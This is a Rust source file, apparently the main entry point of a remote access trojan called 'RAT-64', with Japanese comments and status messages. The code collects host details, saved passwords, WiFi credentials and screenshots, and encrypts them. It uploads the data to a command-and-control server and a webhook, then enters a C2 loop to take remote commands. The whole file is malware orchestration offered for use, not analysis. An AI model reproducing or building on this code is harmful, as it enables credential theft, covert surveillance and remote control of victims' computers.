// RAT-64 - モジュール化された統合システム情報収集ツール
use rmp_serde::encode::to_vec as to_msgpack_vec;
use rand::RngCore;
use rat_64::{
    encrypt_data_with_key, 
    load_config_or_default, 
    IntegratedPayload, 
    send_unified_webhook,
    execute_rat_operations,
    C2Client
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🦀 RAT-64 システム情報収集ツール (強化版) 起動中...");
    
    // 設定読み込み
    let config = load_config_or_default();
    println!("✅ 設定読み込み完了");
    
    // 設定検証
    if let Err(e) = rat_64::core::config::validate_config(&config) {
        println!("❌ 設定エラー: {}", e);
        return Ok(());
    }

    // C2クライアントの初期化
    let mut c2_client = C2Client::new(config.clone());
    
    // 統合データ収集（メイン処理）
    if config.command_server_enabled {
        println!("🔍 データ収集開始...");
        match perform_main_data_collection(&config, &mut c2_client).await {
            Ok(()) => println!("✅ データ収集完了"),
            Err(e) => {
                eprintln!("❌ データ収集エラー: {}", e);
                return Ok(());
            }
        }
        
        // データ収集完了後、C2待機状態に移行
        println!("\n🎯 データ収集完了 - C2待機モードに移行");
        if let Err(e) = c2_client.start_c2_loop().await {
            eprintln!("🎯 C2 error: {}", e);
        }
    } else {
        // C2機能が無効な場合は一回限りの実行
        println!("🔍 データ収集開始（一回限り実行）...");
        match perform_main_data_collection(&config, &mut c2_client).await {
            Ok(()) => println!("✅ データ収集完了"),
            Err(e) => eprintln!("❌ データ収集エラー: {}", e),
        }
        println!("🎯 C2機能が無効のため終了します");
    }
    
    Ok(())
}

/// メインのデータ収集処理
async fn perform_main_data_collection(
    config: &rat_64::Config, 
    c2_client: &mut C2Client
) -> Result<(), Box<dyn std::error::Error>> {
    match IntegratedPayload::create_with_config(&config).await {
        Ok(mut payload) => {
            println!("✅ データ収集完了:");
            println!("   - システム情報: {}", payload.system_info.hostname);
            println!("   - パスワード: {}件", payload.auth_data.passwords.len());
            println!("   - WiFi認証: {}件", payload.auth_data.wifi_creds.len());
            
            if let Some(ref screenshot_data) = payload.screenshot_data {
                println!("   - スクリーンショット: {}件", screenshot_data.total_count);
            }
            
            // データ暗号化
            println!("🔒 データ暗号化中...");
            let serialized = match to_msgpack_vec(&payload) {
                Ok(data) => data,
                Err(e) => {
                    println!("❌ シリアル化エラー: {}", e);
                    return Ok(());
                }
            };
            let (encrypted, encryption_key, encryption_nonce) = match encrypt_with_random_key(&serialized) {
                Ok(data) => data,
                Err(e) => {
                    println!("❌ 暗号化エラー: {}", e);
                    return Ok(());
                }
            };
            
            // デバッグ用：キーとナンスを出力（本番環境では削除）
            #[cfg(debug_assertions)]
            {
                println!("🔑 DEBUG - Key: {}", base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, &encryption_key));
                println!("🎲 DEBUG - Nonce: {}", base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, &encryption_nonce));
            }
            
            // キーとノンスをペイロードに設定
            payload.set_encryption_info(&encryption_key, &encryption_nonce);
            
            println!("✅ データ暗号化完了 ({}バイト)", encrypted.len());
            
            // C2サーバーにデータをアップロード
            if config.command_server_enabled {
                match c2_client.upload_collected_data(&payload).await {
                    Ok(()) => println!("✅ データサーバーアップロード成功"),
                    Err(e) => println!("❌ データサーバーアップロード失敗: {}", e),
                }
            }
            
            // ファイル保存
            let output_file = "data.dat";
            match std::fs::write(output_file, &encrypted) {
                Ok(()) => println!("💾 暗号化データを{}に保存完了", output_file),
                Err(e) => println!("❌ ファイル保存エラー: {}", e),
            }
            
            // Webhook送信
            if config.webhook_enabled {
                println!("📡 Webhook送信中...");
                match send_unified_webhook(&payload, &config).await {
                    Ok(()) => println!("✅ Webhook送信成功"),
                    Err(e) => println!("❌ Webhook送信失敗: {}", e),
                }
            } else {
                println!("ℹ️  Webhook送信は無効化されています");
            }
            
            // 実行結果サマリー
            println!("\n📊 実行結果サマリー:");
            match execute_rat_operations(&config).await {
                Ok(summary) => println!("{}", summary),
                Err(e) => println!("❌ サマリー生成エラー: {}", e),
            }
        }
        Err(e) => {
            println!("❌ データ収集エラー: {}", e);
            return Ok(()); // エラーが発生してもプログラム自体は正常終了
        }
    }
    
    println!("\n🎯 RAT-64 メイン処理完了！");
    
    // デバッグ用：少し待機
    #[cfg(debug_assertions)]
    {
        println!("Press any key to exit...");
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).ok();
    }
    
    Ok(())
}

// ランダムキーでの暗号化ヘルパー（キーとノンスも返す）
fn encrypt_with_random_key(data: &[u8]) -> Result<(Vec<u8>, [u8; 32], [u8; 12]), rat_64::RatError> {
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    
    rand::rng().fill_bytes(&mut key);
    rand::rng().fill_bytes(&mut nonce);
    
    let encrypted = encrypt_data_with_key(data, &key, &nonce)?;
    Ok((encrypted, key, nonce))
}

// 非Windows環境用のダミー実装
#[cfg(not(windows))]
fn is_admin() -> bool {
    false // Unix系では簡単にはチェックできないため false を返す
}
